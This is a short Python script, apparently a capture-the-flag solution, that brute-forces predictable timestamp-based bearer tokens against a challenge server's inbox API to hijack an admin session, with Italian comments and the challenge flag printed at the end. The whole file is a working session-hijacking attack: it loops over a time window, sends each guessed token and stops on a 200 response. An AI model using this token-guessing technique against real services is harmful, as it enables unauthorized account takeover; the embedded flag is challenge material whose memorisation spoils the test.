import requests

url = "http://d916a1cd-44ac-4614-ba85-365d330064df.offsec.m0lecon.it:8001/api/inbox"


start_time = 1776030027 - 600 
end_time = 1776030027 + 600

for t in range(start_time, end_time):
    token = f"Bearer {t}001" 

    r = requests.get(url, headers={"Authorization": token})
    print(f"\rProvando: {t}001 -{r.status_code}", end="", flush=True)
    
    # Se il server risponde 200, hai trovato la sessione dell'admin!
    if r.status_code == 200:
        
        print(f"Token: {token}")
        
        break



    #offsec{pr3d1ct4bl3_s3ss10ns_NBtBI3gwG55D5eyG}